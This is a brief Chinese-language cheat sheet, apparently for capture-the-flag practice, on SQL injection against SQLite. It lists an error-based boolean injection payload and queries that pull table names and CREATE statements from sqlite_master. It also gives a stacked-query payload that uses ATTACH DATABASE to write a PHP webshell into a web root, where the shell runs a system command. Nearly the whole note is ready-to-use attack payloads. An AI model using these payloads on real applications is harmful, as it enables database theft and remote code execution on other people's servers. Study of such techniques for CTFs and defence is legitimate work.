- # sqlite
	- [参考](https://www.sjkjc.com/sqlite-ref/string-functions/)
	- ```
	  a'||1=2||abs(case(2)when(1)then(1)else(0x8000000000000000)end)||'
	  ```
	- sqlite 中没有`ascii`，用`unicode`代替
	- ```
	  (select group_concat(name) from sqlite_master where type = 'table') # 表名
	  
	  (SELECT sql FROM sqlite_master WHERE tbl_name = 'table_name' AND type = 'table') # 创建表使用的sql
	  ```
	- 写webshell
		- ```
		  1; ATTACH DATABASE '/var/www/html/data/qazxsw.php' as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES ('<?php echo system(\"/readflag\"); ?>'); -- xyz
		  ```